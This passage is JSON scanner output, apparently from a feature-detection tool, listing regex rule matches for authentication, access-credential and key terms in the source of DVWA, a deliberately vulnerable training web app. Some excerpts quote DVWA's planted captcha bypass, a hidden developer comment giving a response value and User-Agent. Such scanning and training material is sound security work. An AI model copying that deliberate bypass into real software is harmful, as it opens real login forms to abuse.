        "excerpt": "if( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n",
        "startLocationLine": 65,
        "startLocationColumn": 18,
        "endLocationLine": 65,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\n",
        "startLocationLine": 68,
        "startLocationColumn": 28,
        "endLocationLine": 68,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n",
        "startLocationLine": 69,
        "startLocationColumn": 18,
        "endLocationLine": 69,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\\n\t\t\t&lt;!-- **DEV NOTE**   Response: &#39;hidd3n_valu3&#39;   &amp;&amp;   User-Agent: &#39;reCAPTCHA&#39;   **/DEV NOTE** --&gt;\\n&quot;;\n",
        "startLocationLine": 70,
        "startLocationColumn": 16,
        "endLocationLine": 70,
        "endLocationColumn": 24
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\\n\t\t\t&lt;!-- **DEV NOTE**   Response: &#39;hidd3n_valu3&#39;   &amp;&amp;   User-Agent: &#39;reCAPTCHA&#39;   **/DEV NOTE** --&gt;\\n&quot;;\n\n",
        "startLocationLine": 71,
        "startLocationColumn": 18,
        "endLocationLine": 71,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$page[ &#39;body&#39; ] .= &quot;style=\\&quot;display:none;\\&quot;&quot;;\n\n$page[ &#39;body&#39; ] .= &quot;&gt;\n\t\t\t&lt;h3&gt;Change your password:&lt;/h3&gt;\n\t\t\t&lt;br /&gt;\n\n\t\t\t&lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;1\\&quot; /&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n",
        "startLocationLine": 57,
        "startLocationColumn": 20,
        "endLocationLine": 57,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n",
        "startLocationLine": 64,
        "startLocationColumn": 12,
        "endLocationLine": 64,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "if( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n",
        "startLocationLine": 65,
        "startLocationColumn": 18,
        "endLocationLine": 65,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\n",
        "startLocationLine": 68,
        "startLocationColumn": 28,
        "endLocationLine": 68,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "}\n\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n",
        "startLocationLine": 69,
        "startLocationColumn": 18,
        "endLocationLine": 69,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\\n\t\t\t&lt;!-- **DEV NOTE**   Response: &#39;hidd3n_valu3&#39;   &amp;&amp;   User-Agent: &#39;reCAPTCHA&#39;   **/DEV NOTE** --&gt;\\n&quot;;\n",
        "startLocationLine": 70,
        "startLocationColumn": 16,
        "endLocationLine": 70,
        "endLocationColumn": 24
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "$page[ &#39;body&#39; ] .= &quot;\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\\n\t\t\t&lt;!-- **DEV NOTE**   Response: &#39;hidd3n_valu3&#39;   &amp;&amp;   User-Agent: &#39;reCAPTCHA&#39;   **/DEV NOTE** --&gt;\\n&quot;;\n\n",
        "startLocationLine": 71,
        "startLocationColumn": 18,
        "endLocationLine": 71,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "\n// Check if we have a reCAPTCHA key\n$WarningHtml = &#39;&#39;;\nif( $_DVWA[ &#39;recaptcha_public_key&#39; ] == &quot;&quot; ) {\n\t$WarningHtml = &quot;&lt;div class=\\&quot;warning\\&quot;&gt;&lt;em&gt;reCAPTCHA API key missing&lt;/em&gt; from config file: &quot; . realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;config&quot; . DIRECTORY_SEPARATOR . &quot;config.inc.php&quot; ) . &quot;&lt;/div&gt;&quot;;\n\t$html = &quot;&lt;em&gt;Please register for a key&lt;/em&gt; from reCAPTCHA: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.google.com/recaptcha/admin/create&#39; );\n\t$hide_form = true;\n}\n\n",
        "startLocationLine": 38,
        "startLocationColumn": 24,
        "endLocationLine": 38,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\\n\t\t\t&lt;!-- **DEV NOTE**   Response: &#39;hidd3n_valu3&#39;   &amp;&amp;   User-Agent: &#39;reCAPTCHA&#39;   **/DEV NOTE** --&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 73,
        "startLocationColumn": 47,
        "endLocationLine": 73,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: File Upload&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;upload&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;upload&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/index.php",
        "ruleId": "AI040400",
        "ruleName": "Authorization: Permissions",
        "ruleDescription": "Authorization: Permissions",
        "pattern": "\\b(permissions*)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authorization.Permissions"
        ],
        "sample": "permissions",
        "excerpt": "// Check if folder is writeable\n$WarningHtml = &#39;&#39;;\nif( !is_writable( $PHPUploadPath ) ) {\n\t$WarningHtml .= &quot;&lt;div class=\\&quot;warning\\&quot;&gt;Incorrect folder permissions: {$PHPUploadPath}&lt;br /&gt;&lt;em&gt;Folder is not writable.&lt;/em&gt;&lt;/div&gt;&quot;;\n}\n// Is PHP-GD installed?\nif( ( !extension_loaded( &#39;gd&#39; ) || !function_exists( &#39;gd_info&#39; ) ) ) {\n\t$WarningHtml .= &quot;&lt;div class=\\&quot;warning\\&quot;&gt;The PHP module &lt;em&gt;GD is not installed&lt;/em&gt;.&lt;/div&gt;&quot;;\n}\n",
        "startLocationLine": 37,
        "startLocationColumn": 59,
        "endLocationLine": 37,
        "endLocationColumn": 70
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "windows",
        "excerpt": "\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\\n&quot;;\n\ndvwaHtmlEcho( $page );\n\n",
        "startLocationLine": 62,
        "startLocationColumn": 108,
        "endLocationLine": 62,
        "endLocationColumn": 115
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Brute Force&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;brute&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;brute&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t&lt;h1&gt;Vulnerability: Brute Force&lt;/h1&gt;\n\n\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;h2&gt;Login&lt;/h2&gt;\n\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n",
        "startLocationLine": 40,
        "startLocationColumn": 7,
        "endLocationLine": 40,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n\n$page[ &#39;body&#39; ] .= &quot;\n",
        "startLocationLine": 48,
        "startLocationColumn": 35,
        "endLocationLine": 48,
        "endLocationColumn": 40
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n\n$page[ &#39;body&#39; ] .= &quot;\n",
        "startLocationLine": 48,
        "startLocationColumn": 50,
        "endLocationLine": 48,
        "endLocationColumn": 55
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Username",
        "excerpt": "\t\t&lt;h2&gt;Login&lt;/h2&gt;\n\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n",
        "startLocationLine": 43,
        "startLocationColumn": 4,
        "endLocationLine": 43,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
